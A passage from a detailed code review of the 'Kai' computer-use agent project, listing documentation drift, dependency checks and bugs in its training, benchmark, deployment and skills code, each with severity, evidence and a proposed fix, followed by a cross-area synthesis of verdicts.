**What:** The handoff prompt describes the product as "Linux and Windows", states "No macOS work", and freezes the state at 2026-10-12 (pre computer-use foundation, pre macOS release). The repository has since reversed both facts: README opens with "Linux, Windows and macOS (Apple Silicon)", `DECISIONS.md` 2026-10-15 entries reverse the macOS decision, and `release.yml` ships `kai-macos-aarch64.zip`.
**Evidence:** `docs/NEXT_SESSION_PROMPT.md:6,43` vs `README.md:5-6`, `.github/workflows/release.yml:22`, `docs/DECISIONS.md` (macOS reversal) and `dist/kai-macos-aarch64.zip`.
**Impact:** A new contributor or agent following the "read first / how to work" instructions will scope out macOS work the project now requires and replay 2026-10-12 priorities — a maintainability hazard, not a product bug.
**Fix:** Delete the file or rewrite it as a short pointer to the current sources (README, newest DECISIONS entries, superpowers spec + AUDIT remediation). If kept, add the current date and platform stance at the top.

#### [DOC-02] README/SKILLS inventory counts are stale (models 17→16, skills 9→10, tasks 10→30)
**Severity:** LOW
**Location:** `README.md:45` ("17 pinned, hash-checked models"), `README.md:65` ("skills/ 9 shipped skills. bench/ 10 benchmark tasks"), `docs/SKILLS.md:57-68` (9-row shipped table)
**What:** `catalog.json` parses to 16 entries; `skills/` holds 10 dirs; `bench/tasks.yaml` defines 30 tasks. `blender-modeling` ships but appears in neither README nor the SKILLS.md table. This is the surviving half of audit finding A20 (2026-10-15), which explicitly noted "README says nine shipped skills; validation finds ten".
**Evidence:** `python3 -c "len(json['models'])"` → 16; `ls skills/` → 10; `grep -c "id:" bench/tasks.yaml` → 30; `kai skill validate` evidence reports 10/10 checked.
**Impact:** Front-page numbers are wrong in three places; users comparing the pitch to `kai models list` / `kai bench` see the mismatch immediately.
**Fix:** Update the three counts (or remove them in favor of "a curated catalog of open models" phrasing), and add a `blender-modeling` row to `docs/SKILLS.md`. Prefer wording that survives catalog growth.

#### [DOC-03] HARNESS.md test count and thinking level are outdated
**Severity:** LOW
**Location:** `docs/HARNESS.md:310` ("`cargo test --workspace` (110 tests)"), `docs/HARNESS.md:288` (`thinkingLevel: minimal`), `docs/HARNESS.md:5,13` (Linux/Windows-only framing)
**What:** The workspace test count is 641 (with 2 ignored) per `docs/evidence/ui-ux-audit-2026-10-16-pass2.json`; DECISIONS.md records the Gemini thinking level as `"low"` with a retry-and-remember fallback for `thinkingConfig`; the harness diagram paragraph omits macOS although `kai-os` now ships macOS AX support and the app builds for it.
**Evidence:** `docs/evidence/ui-ux-audit-2026-10-16-pass2.json` ("passed": 641); `DECISIONS.md:49-56` (`thinkingLevel: "low"`); `README.md:59-61` ("Linux, Windows, macOS").
**Impact:** HARNESS.md is the documented "full explanation" of the loop; readers get a wrong test baseline and a stale model-config fact.
**Fix:** Replace "(110 tests)" with a pointer to the newest evidence JSON (counts drift weekly), change `minimal` → `low` with the retry note, and mention macOS AX in the OS layer description.

#### [DOC-04] DESIGN.md still mixes the superseded saffron spec with the current Kai Glass spec
**Severity:** LOW
**Location:** `docs/DESIGN.md:32,46` (saffron principles/tokens) vs `:66+` ("Kai Glass (v2, 2026-10-12)"); Linux/Windows audience wording; A20 acceptance ("one current screen/state specification ... archive superseded design prose") unmet
**What:** The document opens with the v1 saffron palette and then introduces v2 "Kai Glass" with ember accents (`#F5A524`/`#C2410C`); a reader cannot tell which spec is binding. The audit already recorded this and asked for one current spec with implementation status.
**Evidence:** `docs/DESIGN.md` sections "Calm by default" / "Accent: saffron" vs "Kai Glass (v2)"; `docs/AUDIT_2026_10_15.md:282-293` (A20).
**Impact:** Design contributors and future UI work pick the wrong tokens; the app code uses Glass (ember) while the doc's first spec says saffron.
**Fix:** Collapse to the Glass spec, demote saffron to a dated "superseded" appendix, and state the current platform audience (add macOS).

#### [DOC-05] DECISIONS.md fixed-decisions section contradicts the macOS reversal
**Severity:** LOW
**Location:** `docs/DECISIONS.md:14,128,243` ("not a release target", "macOS demoted ... not a release target", "macOS is not a target (owner: Linux and Windows)")
**What:** The append-only log is working as designed, but the "fixed decisions" preamble region still asserts macOS is not a target, while later dated entries and the shipping pipeline reverse it. A reader who lands on line 243 has no pointer forward.
**Evidence:** `release.yml` macOS matrix; `README.md:5`; DECISIONS entries dated 2026-10-15 (macOS release work).
**Impact:** Same class as DOC-01: contradictory guidance, small blast radius because the log is chronological.
**Fix:** Add a one-line dated supersession note next to the three lines (append-only convention preserved: annotate, don't rewrite).

#### [DOC-06] .claude/settings.json keeps a jevos/OpenVINO permission allowlist
**Severity:** LOW
**Location:** `.claude/settings.json` (10 lines, tracked)
**What:** Five `Bash(...)` allow rules target a scratch jevos install (`/opt/jevos`, `/tmp/claude-0/*jev-linux-x64.tar.gz`, `curl *127.0.0.1:8017`). No tracked script, workflow, or crate builds or runs `/opt/jevos`; README says the jevos executor "shows no measurable benefit yet".
**Evidence:** file content; `grep -rln jevos` across workflows/scripts finds nothing outside docs and this file.
**Impact:** Harmless but misleading repo metadata: new contributors see permissions for tooling the project does not use, and the rules widen local agent permissions with no current consumer.
**Fix:** Remove the block, or keep it only if the jevos experiment is still actively run, with a comment saying so.

#### [DOC-07] Two evidence JSONs and one image are orphaned
**Severity:** LOW
**Location:** `docs/evidence/ui-ux-audit-2026-10-16.json`, `docs/evidence/ui-ux-audit-2026-10-16-pass2.json`, `docs/img/blender-table.png`
**What:** Both UI/UX evidence files are valid and match `docs/UI_UX_AUDIT_2026_10_16.md` (baselines f27499b / 6face92, 618/641 tests) but no document links them — only the computer-use JSON has a "Machine-readable verification summary" link (`AUDIT_2026_10_15.md:481`). `blender-table.png` is referenced by no file of any type (`blender-table` regex → 0 matches repo-wide); `img/set-of-marks-gtk.jpg` is used by HARNESS.md.
**Evidence:** `grep -rln` for each filename; `docs/evidence/` listing; HARNESS.md:65 for the used image.
**Impact:** Evidence exists but is unfindable from the report it belongs to; the unused PNG is dead weight (and the audit doc's screenshot caveats make traceability more, not less, important).
**Fix:** Add an evidence-summary link section to `UI_UX_AUDIT_2026_10_16.md` mirroring the AUDIT doc; either embed `blender-table.png` where the Blender skill is described or delete it.

#### [DOC-08] Vendored Ely copy intentionally diverges from the recorded upstream revision
**Severity:** INFO
**Location:** `vendor/ely-gpui-component/` (20 MB, path dep, excluded from workspace test/lint) per `vendor/README.md`
**What:** The vendor README is exemplary — pinned upstream SHA, license, CI-cache recovery story, and an explicit "Local UI patch — 2026-10-16" section (scroll clamp + focusable activity buttons) that says to preserve or reapply it on update. The trade-off: the vendored tree is no longer pristine, so "same revision `Cargo.toml` pinned before" now needs the patch note to be true, and live nested-scroll/accessibility acceptance is still pending.
**Evidence:** `vendor/README.md` ("intentionally differs from the recovered upstream"); patch code present in `layout/scroll.rs` (`clamp` at 125/153/196/340), `layout/scroll_policy.rs`, `shell/activity.rs`.
**Impact:** Documentation is doing its job; risk is future drift if an update replaces the folder without reapplying the patch — mitigated by the note, not eliminated.
**Fix:** No change needed now; when upstream is reachable again, decide patch-vs-upstream and update the note plus the A08 acceptance evidence.

#### [DOC-09] Evidence test totals differ across today's documents (616 / 618 / 641)
**Severity:** INFO
**Location:** `docs/evidence/*.json` and `docs/AUDIT_2026_10_15.md` (422-test selected table)
**What:** Three same-day evidence files cite three totals because each names a different revision/branch (`c9054dd`, `f27499b`, `6face92`). They are internally consistent, but a reader can easily read "the tests" as contradictory, and HARNESS.md then hardcodes an even older number (110).
**Evidence:** the three JSONs; `docs/AUDIT_2026_10_15.md:349-359` (422 selected existing tests, branch scoped).
**Impact:** Mild confusion only; the revision field is the mitigation.
**Fix:** Keep counts only in evidence JSONs; have README/HARNESS say "see `docs/evidence/` for the latest verified run" instead of embedding numbers.

#### [DOC-10] Untracked review scaffold at repo root contains empty sections
**Severity:** INFO
**Location:** `CODE_REVIEW_2026_10_16.md` (77 lines, untracked, this review's index)
**What:** The file declares a 11-scope review plan and appends that area sections arrive "as review agents finish", with §3/§4 placeholders still empty. It is the only untracked file in the tree (`git status --porcelain`).
**Evidence:** file content, lines 66-77; clean `git status` otherwise.
**Impact:** None today; if committed as-is it ships placeholder scaffolding, if deleted the fragment provenance appendix §5 has no home.
**Fix:** Decide before commit: publish a filled synthesis (with fragment provenance) or drop the scaffold; do not commit with live `<!-- ... -->` placeholders.

### Dependencies

Snapshot (`Cargo.lock`, version 4): 939 packages, **zero** non-crates.io
sources (no `git+` deps), workspace-wide MIT.

| Where | Dependency facts verified | Verdict |
| --- | --- | --- |
| Workspace pins | `gpui = { package = "gpui-pre", version = "=0.3.8" }` resolves from crates.io with checksum; `ely-gpui-component` path dep with documented provenance + patch | OK — the pin survives even though the Ely upstream repo is private |
| Heavy runtime crates | tokio 1.53.2, reqwest 0.12.28, image 0.25.10, rustls 0.23.45, hyper 1.12.0 — one version each in the lock | OK |
| Platform shims | windows-sys ×6 (0.45–0.61), windows-targets ×4, hashbrown ×4 (0.14–0.17), rand ×3, getrandom ×3, thiserror 1/2, syn 2/3, toml 0.8/1.1 | Normal ecosystem churn; nothing to pin away |
| `kai-core` | os-free set; sampled `regex` (task_checks/probe), `futures` (client plumbing), `serde` all referenced in sources | OK |
| `kai-os` | `xcap 0.9` (lock 0.9.8, single copy shared with kai-app), `zip 2.4.2` single, `sha2` used by download verification, `global-hotkey 0.8` used only by `kill.rs`, `open`/`arboard`/`fast_image_resize` all referenced; Linux/Windows crates correctly `cfg`-gated; `objc2` pinned to match xcap | OK |
| `kai-cli` / `kai-app` | `jiff`, `image`, `futures`, `arboard`, `fast_image_resize` each appear in `kai-app` sources | OK |
| Licenses | MIT across crates; README credits list (Lucide ISC, OFL fonts, vLLM/Gemma Apache-2.0, Ely MIT) consistent with vendored LICENSE files | OK |

### Not needed / remove

1. `docs/NEXT_SESSION_PROMPT.md` — delete or archive with a dated rewrite (DOC-01).
2. `.claude/settings.json` jevos allowlist — remove unless the executor experiment is active (DOC-06).
3. `docs/img/blender-table.png` — unused; link it where the Blender skill lives or drop it (DOC-07).
4. `docs/evidence/ui-ux-audit-2026-10-16*.json` — keep, but link them from `UI_UX_AUDIT_2026_10_16.md` (DOC-07).
5. `docs/DESIGN.md` saffron v1 prose — fold into a dated "superseded" appendix (DOC-04, A20).
6. `CODE_REVIEW_2026_10_16.md` placeholder comments — resolve before any commit (DOC-10).
7. HARNESS.md "(110 tests)" — replace with an evidence pointer so the count cannot rot again (DOC-03, DOC-09).

### What's good

- **Evidence discipline.** Every 2026-10-16 JSON names date, revision, branch, host target, per-suite counts, and an explicit `unverified` list. This is rare and makes spot-checks like this one fast and decisive.
- **Honest claims.** README labels its own benchmark gaps ("one run per model", "wall-clock not compared", "no measurable benefit yet" for jevos); AUDIT separates "implemented and exercised locally" from release gates; ROADMAP labels estimates `[Est.]`.
- **Audit-with-acceptance-criteria pattern.** Each A-number carries a reproduction note and an acceptance condition, so fixes are verifiable — and two of the three in-scope P3s are already verifiably fixed/partial.
- **Vendor documentation.** `vendor/README.md` is a model for vendored forks: provenance, license, recovery history, and an explicitly flagged local patch with reapply instructions.
- **Room to grow safely.** MODEL_STORE's shelf design (curated + pull-your-own) and the "intentionally unchanged" catalog decision mean the wrong README count is cosmetic, not an architecture problem.
- **Zero broken links** across the entire docs tree, checked mechanically.

### Open questions

1. Is README's "17" a hint of a planned 17th catalog entry, or simply drift from when the catalog had one more row? Decide the canonical phrase ("all models in `crates/kai-core/src/models/catalog.json`") so this cannot drift again.
2. Is the jevos executor experiment still active (its doc and README section stay current), or parked? That decides DOC-06 and EXECUTOR.md's future.
3. Should the two UI/UX evidence JSONs be linked into `UI_UX_AUDIT_2026_10_16.md` (mirroring the computer-use link in AUDIT), and can `blender-table.png` be attached to the Blender skill docs?
4. Will this review's fragments (including `CODE_REVIEW_2026_10_16.md` §3/§4) be committed as documentation, and who owns filling the placeholders?
5. When Ely upstream reappears, is the scroll/focus patch intended for upstream contribution or will it live as a permanent local delta?
6. `docs/HARNESS.md` remains the "full explanation" doc but predates the computer-tools v1 contract; should it link `docs/COMPUTER_TOOLS.md` as the current action layer?

---

## 3.11 TBD — Training, bench suite, deploy, skills

*Reviewed files: 59. Findings: 0C / 1H / 3M / 4L / 0I.*

Method: every source/config file in scope was read in full (train/**, deploy/digitalocean/**, skills/**, bench non-generated). All 100 `bench/results/**` JSONs were machine-checked (date, backend, model, `passed`/`total`, command); top-level `.md` summaries and the `2026-10-12`/`verification` reports were read; per-run `.md` files under results subfolders are rendered duplicates of the JSONs and were checked only via those JSONs. `bench/runs/` is git-ignored generated data (175 files); one run sampled (`2026-10-15-mock-recorded/write-note` — macOS mock, `kai v0.1.0`). Repo was left untouched (`git status` shows an untracked `CODE_REVIEW_2026_10_16.md` not created by this review).

### Scope checklist (file — lines — verdict)

train/ (20 files)
- `kai_data.py` 478 — read; stale reply check, see TBD-04
- `sft_gemma.py` 303 — read; seed 17, save_steps 200, save_total_limit 3; ok
- `grpo_gemma.py` 359 — read; seed 17, dry-run `FakeRunner`; ok
- `grpo_env.py` 364 — read; task-id allowlist, setup/check only from tasks.yaml, env scrub, own D-Bus; good
- `eval.py` 154 — read; held-out handling ok
- `rollout_proxy.py` 219 — read; 127.0.0.1 only, never logs keys, SSE pass-through tested; good
- `README.md` 269 / `distill.md` 84 / `results.md` 12 / `heldout.txt` 10 — read; training parked by owner 2026-10-10, licensing/TOS caveats documented
- `requirements-gpu.txt` 21 / `requirements-dryrun.txt` 6 / `.gitignore` 5 — read; ok
- `tests/make_synthetic.py` 163 / `run_all.sh` 53 / `test_proxy.py` 101 — read; ok
- `configs/sft_26b.yaml` 18 / `sft_e4b.yaml` 16 / `sft_31b.yaml` 18 / `grpo_26b.yaml` 28 — read; ok

bench/ (non-generated: 15 files)
- `tasks.yaml` 527 — read; **30** tasks with embedded `mock:` replies + real checks; matches runner contract
- `fixtures/server.py` 71; `fixtures/*.sh` 5 files 102; `fixtures/site/*` 4 files 72 — read; realistic, clean teardown
- `driver/gtk3.py` 41 / `qt5.py` 37 / `web.html` 19 — read; ok
- `results/`: top-level 25 files / 3,724 lines — read or machine-checked; TBD-03, TBD-06
- `results/2026-10-12-batch/` 2 files; `2026-10-12-live/` 16; `2026-10-12-verification/` 9 + `guard-removal.py` (read); `2026-10-13-live/` 10; `2026-10-13-local/` 4; `browser-ab-2026-10-13/` 32; `holo-2026-10-13/` 2 — JSONs machine-checked; subfolders deliberately excluded from `kai bench report` (documented in `2026-10-12-verification.md:4-6`)
- `runs/` 175 files — git-ignored; sampled one, correctly not committed

deploy/digitalocean/ (11 files)
- `README.md` 67 — read; TBD-02/03
- `up.sh` 115 — read; TBD-01 (installs nothing Caddy needs), TBD-02
- `cloud-init.yaml` 119 — read; TBD-01 (Caddyfile + apt caddy), TBD-02 (`tls internal`)
- `smoke.sh` 50 — read; TBD-08
- `down.sh` 23 — read; good
- `serve-lora.sh` 98 — read; TBD-07
- `TRAINING.md` 66 / `train-up.sh` 95 / `train-down.sh` 26 / `cloud-init-train.yaml` 102 — read; training droplet is loopback-only, SSH-only firewall, refuses to kill serving droplet; good
- `fixtures/README.txt` 1 — read; TBD-08 placeholder

skills/ (13 files)
- 10 × `SKILL.md` (19–38 lines): `open-and-search-web`, `run-terminal-task`, `system-settings-dark-mode`, `pc-security-checkup`, `write-email-gmail`, `blender-modeling`, `spotify-or-youtube-play`, `fill-form-from-text`, `own-site-security-check`, `rename-files-in-folder` — all validate against `crates/kai-core/src/skill.rs` (name=dir, description ≤1024, compatibility ≤500, `kai` steps JSON valid); docs drift TBD-05
- `own-site-security-check/references/FINDINGS.md` 15 — read; accurate fixes
- `blender-modeling/scripts/inspect.py` 26 / `preview.py` 31 — read; `{skill_dir}` substitution verified at `crates/kai-core/src/prompt.rs:148`

### Verdict (1–10)

- Train pipeline: **7/10** — careful safety design, seeded and testable, but parked, dry-run-only, and TBD-04 silently drops valid data.
- Bench harness: **8/10** — self-contained tasks with embedded recordings + real checks, honest not-measured sections; stale counts and one missing raw file.
- Deploy recipe: **5/10** — training droplet is solid; the serving path cannot work as shipped (TBD-01, TBD-02) and the smoke test is a placeholder (TBD-08).
- Skills quality: **8/10** — spec-compliant, progressive disclosure, safe defaults; `docs/SKILLS.md` contradicts and undercounts them (TBD-05).
- Honesty of claims: **7/10** — unusually candid about limitations, but the headline table's raw-results pointer doesn't contain its 14/14 evidence (TBD-03) and doc text drifts (TBD-05).

### Findings

#### [TBD-01] Serving Droplet's Caddyfile uses plugins the installed Caddy does not have — the public endpoint never comes up
- **Severity:** HIGH
- **Location:** `deploy/digitalocean/cloud-init.yaml:93-106,114`
- **What:** The Caddyfile uses `exec` (`:97`) and `rate_limit` (`:100-102`), but runcmd installs `caddy` from the stock Ubuntu 24.04 apt archive (`:114`) without adding the official repo or building with xcaddy. `exec` is the third-party `abiosoft/caddy-exec` module and `rate_limit` is the third-party `mholt/caddy-ratelimit` module (Caddy docs: "This module does not come with Caddy"); Ubuntu noble ships caddy 2.6.2, which has neither. `caddy` will fail config adaptation, so `systemctl enable --now caddy` (`:119`) leaves nothing listening on :443. The packages meant for the official repo (`debian-keyring`, `debian-archive-keyring`, `apt-transport-https`, `:10-12`) are installed and then never used.
- **Evidence:** `handle /health { exec /usr/local/bin/kai-health }` (`:96-98`); `rate_limit { zone kai { key {remote_host} events 60 window 1m } }` (`:100-102`); `apt-get install -y nvidia-container-toolkit caddy` (`:114`).
- **Impact:** `up.sh` → `curl https://<host>/v1` (the README's headline flow) cannot work as shipped; a user pays ~$3.39/hr for a dead endpoint and debugs a red herring.
- **Fix:** install Caddy from the official apt repo and build with xcaddy (`--with github.com/abiosoft/caddy-exec --with github.com/mholt/caddy-ratelimit`), or drop the two custom directives: replace `exec /health` with a stock `reverse_proxy` to a tiny loopback health service (or a `respond` fed by a systemd timer) and enforce rate limiting without the plugin (or via xcaddy).

#### [TBD-02] Documented HTTPS checks fail against the internal CA; `KAI_HOSTNAME_MODE` is inert
- **Severity:** MEDIUM
- **Location:** `deploy/digitalocean/cloud-init.yaml:92-94`; `up.sh:74,90-95,103`; `README.md:39,63-65`; `smoke.sh:36-38`
- **What:** The site is a `:443` catch-all with `tls internal`, so clients must trust Caddy's local CA (or pass `--cacert`/`-k`), but the documented checks use plain `curl`. `README.md:39` says `curl -s https://<host>/health # -> ready`; `up.sh:103` prints the same; `smoke.sh` curls `$KAI_ENDPOINT` with no `-k` and `set -euo pipefail`, so it aborts on the first TLS verification error. `__HOSTNAME_MODE__` appears only in a Caddyfile comment (`cloud-init.yaml:92`), so `KAI_HOSTNAME_MODE=your.domain` changes nothing on the Droplet (the README admits you must hand-edit the Caddyfile to swap `tls internal` for an e-mail, `README.md:63-65`).
- **Evidence:** `tls internal` (`cloud-init.yaml:94`); `sed -e "s|__HOSTNAME_MODE__|${HOSTNAME_MODE}|g"` (`up.sh:74`) with the placeholder only inside `# __HOSTNAME_MODE__ is …` (`cloud-init.yaml:92`); smoke `curl -s -o /dev/null … "$KAI_ENDPOINT/chat/completions"` (`smoke.sh:36-38`).
- **Impact:** even after fixing TBD-01, the first command a user runs fails with curl error 60 and pushes them toward `-k`; a real domain does not get a public cert without manual edits.
- **Fix:** either fetch a real cert by default (hostname + ACME e-mail) and keep `tls internal` behind a dev flag, or make `up.sh`/README/smoke print and use `curl --cacert` (or an explicit, documented `--insecure`) and export Caddy's root CA; wire `KAI_HOSTNAME_MODE` into the Caddyfile site address.

#### [TBD-03] README's head-to-head points at raw results that do not contain the 14/14 Gemma 26B run
- **Severity:** MEDIUM
- **Location:** `README.md:105-130` (claimed at `:108`, pointer at `:128`)
- **What:** The table's 26B row ("14 / 14", 75 steps, 104 calls) cites `bench/results/2026-10-10-*.json`, but the only shipped 2026-10-10 Gemma 26B file is `2026-10-10-gemini-gemma-4-26b-a4b-it.json` — the 1-task `--executor --only web-form-submit --no-record` run, `passed 0/1`. The 14/14 run's JSON was lost to a script error (the repo admits it: `2026-10-10-executor-ab.md:3` — "the JSON files were overwritten by a script error") and only the in-prose record survives (`DECISIONS.md:368`). The 31B (`11/14`), GPT-5 mini (`12/14`) and GPT-4.1 mini (`8/14`) files are present and match the table.
- **Evidence:** `bench/results/2026-10-10-gemini-gemma-4-26b-a4b-it.json` → `command: … --executor --only web-form-submit --no-record; passed: 0; total: 1`; no other 14-task or 30-task 26B file exists under `bench/results/`; `DECISIONS.md:367-372` records 14/14 and 23/30 with caveats.
- **Impact:** the headline claim reads as less credible than the repo's actual transparency warrants; a reader clicking through from the README sees the opposite result.
- **Fix:** re-run or restore the 26B export into `bench/results/`, or amend `README.md:127-130` to say the raw 26B files were lost and point at `DECISIONS.md` §Round 3 and `2026-10-10-executor-ab.md` explicitly.

#### [TBD-04] `train/kai_data.py` rejects replies Kai itself accepted (stale key allowlist)
- **Severity:** MEDIUM
- **Location:** `train/kai_data.py:40-42,146-148` (comment at `:131`)
- **What:** `check_reply` claims to "mirror StepReply::parse_checked", but the allowlist is `DECISION_KEYS + {"then", "need_screen"}`. Rust strips the optional `plan`, `outcomes`, `read_page` and `memo` fields before validating the decision (`crates/kai-core/src/reply.rs:70-84`), so replies carrying any of them are valid for Kai but become `unknown_field:` here and get dropped from exported SFT/GRPO rows.
- **Evidence:** Python `REPLY_EXTRA_KEYS = {"then", "need_screen"}` (`kai_data.py:42`); `unknown = set(obj) - DECISION_KEYS - REPLY_EXTRA_KEYS … return False, "unknown_field:…"` (`:146-148`); Rust `obj.remove("plan")`, `obj.remove("outcomes")`, `obj.remove("read_page")`, `obj.remove("memo")` (`reply.rs:70-84`).
- **Impact:** silent data loss exactly for the steps that exercise plans, the outcome gate, browser read_page and memory — the newest features; the parity test implied by the comment does not exist.
- **Fix:** strip the same four keys (or extend `REPLY_EXTRA_KEYS`) before the unknown-field check, and add a test that feeds `reply.rs`'s accepted fixtures to `check_reply`.

#### [TBD-05] `docs/SKILLS.md` contradicts the shipped form skill; counts are stale in docs and README
- **Severity:** LOW
- **Location:** `docs/SKILLS.md:54-66`; `README.md:65`; `skills/fill-form-from-text/SKILL.md:19-25`
- **What:** The docs table says `fill-form-from-text` "never … submits", but the shipped v1.1 body says to click **Send/Submit** yourself (as `risk: high`) when the user asked, never for payments, and never without the request. The shipped-skills table lists 9 skills and omits `blender-modeling`; `README.md:65` says "skills/ 9 shipped skills. bench/ 10 benchmark tasks." — the repo has 10 skills and 30 tasks (later reports already say "skills 10/10", e.g. `bench/results/2026-10-12-verification.md:103`).
- **Evidence:** "never fills passwords or payments, never submits" (`docs/SKILLS.md:61`) vs "click **Send** or **Submit** yourself … with `risk` set to `high`" (`fill-form-from-text/SKILL.md:19-22`).
- **Impact:** an auditor reading the docs gets a stricter safety picture than the product actually implements (the skill is still gated by Kai's high-risk approval, but the doc is wrong); stale counts erode trust in the docs.
- **Fix:** update the table (add `blender-modeling`, correct the submit wording), refresh `README.md:65` counts.

#### [TBD-06] The 65 ms overhead headline has no shipped raw file
- **Severity:** LOW
- **Location:** `README.md:94`; `DECISIONS.md:185-191`
- **What:** The visible "Measured" table gives `kai bench --backend replay`, "5 real tasks, 5/5 passed", p50 65 ms / p95 93 ms, but no matching results file exists under `bench/results/`. The only in-repo record is the DECISIONS.md paragraph (including the 106→65 ms optimisation). The shipped 30-task replay (`2026-10-09-replay-recorded.json`) shows step p50 628 ms (different, single-run set), and the 2026-10-12 replays show 104–110 ms on 20 tasks — none is the cited 5-task run.
- **Evidence:** `README.md:94`; `DECISIONS.md:185-186` and `:190-191`; no 5-task replay JSON in `bench/results/`; `bench/runs/` (where it likely lived) is git-ignored.
- **Impact:** the most quotable performance number cannot be reproduced from the repo, inviting suspicion the rest of the table doesn't deserve.
- **Fix:** commit the 5-task replay JSON under `bench/results/` with a dated stem, or annotate the row with where it was recorded.

#### [TBD-07] `serve-lora.sh` falls back to rank 8 for adapters with rank > 256
- **Severity:** LOW
- **Location:** `deploy/digitalocean/serve-lora.sh:45-49`
- **What:** `MAX_RANK=8; for r in 8 16 32 64 128 256; do if RANK <= r …` — when `RANK > 256` the loop never fires and `MAX_RANK` stays 8, so the generated drop-in passes `--max-lora-rank 8` for a rank-512 adapter and vLLM refuses to load it (or the run misleads for any future larger rank).
- **Evidence:** `serve-lora.sh:46-49`; `--max-lora-rank $MAX_RANK` written into the drop-in at `:90`.
- **Impact:** confusing late failure on an unserved adapter; LOW because ranks >256 are rare.
- **Fix:** after the loop, if `RANK > MAX_RANK` exit with "adapter rank $RANK unsupported (max 256)".

#### [TBD-08] `smoke.sh` cannot run as shipped (missing fixture) and uses GNU-only `time -f`
- **Severity:** LOW
- **Location:** `deploy/digitalocean/smoke.sh:13-17,36-38`; `deploy/digitalocean/fixtures/README.txt:1`
- **What:** The only shipped "smoke test" needs `fixtures/screen.jpg`, which does not exist — the fixtures dir contains a one-line placeholder saying to add a real screenshot before the demo — so the script exits with "No screenshot at …". It also measures with `/usr/bin/time -f '%e'`, which is GNU time; on macOS/BSD (the repo's dev machines, including this review host) `time` has no `-f` and the command fails for the wrong reason.
- **Evidence:** `SHOT="${KAI_SHOT:-$here/fixtures/screen.jpg}"` + existence exit (`smoke.sh:13-17`); `t=$( { /usr/bin/time -f '%e' curl … } 2>&1 )` (`:36-38`); `placeholder: replace with a real screen.jpg before the demo` (`fixtures/README.txt`).
- **Impact:** the README-documented latency smoke test is dead on arrival on any fresh checkout; contributors on macOS hit a confusing shell error instead.
- **Fix:** commit a tiny valid JPEG (the request only needs a decodable image), or make the missing shot an explicit setup step in README; time with `python3 -c 'import time; …'` or `date +%s%N` fallback.

### Not needed / remove

- `deploy/digitalocean/fixtures/README.txt` placeholder — replace with the real `screen.jpg` or drop the directory until it exists (folds into TBD-08).
- Nothing else is dead. `bench/runs/` being git-ignored and generated is correct; sub-result folders excluded from `kai bench report` is deliberate and documented.

### What's good

- **Train safety**: `rollout_proxy.py` binds 127.0.0.1 and never logs or echoes API keys (tested); `grpo_env.py` allowlists task ids, reads setup/check only from `tasks.yaml`, scrubs the environment, gives each rollout an empty HOME and its own D-Bus; seeds pinned (17) in both trainers; `tests/run_all.sh` runs a full dry pipeline.
- **Bench rigor**: 30 tasks with embedded mock replies and real check commands; realistic fixtures (local site, LibreOffice sheets, GTK/Qt drivers); every results file carries a "Not measured on this run" section; the 2026-10-12 verification/batch reports state plainly what they could not measure and why, and `guard-removal.py` demonstrates every safety guard has a test that fails without it.
- **Training droplet deploy**: vLLM loopback-only with `VLLM_SERVER_DEV_MODE` + sleep-mode explicitly kept private; firewall SSH-only; separate train API key; `train-down.sh` refuses to destroy `kai-gemma`; secrets only under `.secrets/` (git-ignored).
- **Skills**: all 10 validate against the repo's own spec implementation; names match directories; progressive disclosure keeps prompts small; deterministic `kai` steps are minimal and used where they help; safety skills confirm ownership / ask before fixes; form and email skills never type passwords or payments.

### Open questions

1. Was the serving Droplet ever deployed from `main` as configured? If yes, where is the record — the committed Caddyfile can't load on stock caddy 2.6.2.
2. Where are the 14-task and 30-task Gemma 26B raw runs *supposed* to live: lost to the script error, or intentionally left in the git-ignored `bench/runs/`?
3. Was `KAI_HOSTNAME_MODE` meant to add the official Caddy repo + ACME e-mail automatically, or is hand-editing the Caddyfile the accepted path?
4. `docs/SKILLS.md` "never submits": was that true for fill-form v1.0, and was v1.1's submit-on-request a deliberate loosening that missed the doc?
5. Is `train/kai_data.py` still consumed anywhere (training is parked)? If it is frozen, add a header saying so; if not, fix TBD-04 first.


## 4. Cross-area synthesis

### 4.0 Verdicts on the questions this review was asked

| Lens | Verdict | Where to look |
|------|---------|---------------|
| **How well is the project distributed?** | Strong. Four crates with a real dependency direction (`kai-core` OS-free harness behind ports → `kai-os` implements `Perceptor`/`Actuator` → `kai-cli` and `kai-app` as consumers). No cycles, no god-object across crates. The two smells: app and CLI each hand-roll engine/skill discovery that has already drifted (CLI-19, CLI "remove" list), and `kai-app` reaches into a vendor-tree file for a test (APP-SH-19). | §3.1, §3.6, §3.7 |
| **How well is the code written?** | Consistently careful: small focused modules, invariant-stating comments, fail-closed defaults, unusually low `unwrap` usage on fallible paths, no TODO/FIXME/HACK markers anywhere in `kai-core`, `kai-os` or `kai-cli` (verified by grep). The recurring weakness is silent degradation — swallowing errors and strings like `"action failed"` (CORE-ENG-05), silent settings reset (CORE-CLI-03), silent overwrite of bench JSON (CLI-02). | §3.1–§3.11 verdicts |
| **How well is the architecture based?** | The observe → gate → decide → act → verify pipeline over one shared `Run` state is the product's backbone and every extension (executor, prefix/procedures, best-of, recovery, team) plugs in without bending it (Architecture fit scores 7–9/10 in every core/os area). Fail-closed gates, real cancellation (biased `select!`), and privacy redaction on every egress surface are the highlights. | §3.1, §3.2, §3.3 |
| **How well can the agent (model) use the functionality we expose?** | Mostly good: versioned, validated computer-tool schema; MCP skips approval-requiring steps and downgrades Autopilot (safe posture); skill format is spec-compliant and validated. The gap is failure feedback: invalid/stale tool calls end the run as `AskedUser` instead of a repair turn (CORE-ENG-02), two of three act-error paths replace the real error with `"action failed"` (CORE-ENG-05), prefix action failures are swallowed (CORE-ENG-04), and gate refusals outside the bench are never learned from (CORE-SAFE-16). The model cannot get better at the tools we give it if we hide what went wrong. | §3.1, §3.2, §3.3 |
| **How well is the product/app designed?** | The loop is coherent (onboarding → run live view → approvals → done/report → save-as-skill; Team; model store; bench; memory; skills pages all bind to real engine state in the majority of cases). But the UI carries honesty debts — fabricated Usage constants (APP-UX-04), a mock-only Bench page presented as a feature (APP-UX-08), false-success `open_app`/`open_url` (OS-PER-16), and destructive-scope bugs where the dialog copy and the deletion disagree (APP-UX-02, CORE-SAFE-11). All fixable without redesign. | §3.8 |
| **Where are the fillers?** | A dedicated inventory exists in §3.8 "Fillers inventory" (9 entries): fabricated token/context readings, mock bench data as the page's primary action, a static section heading, a stuck spinner, dead controls, and a test-only capture fixture. Each row carries file:line and a wire-or-remove fix. | §3.8 |

### 4.1 What the whole system gets right (do not regress)

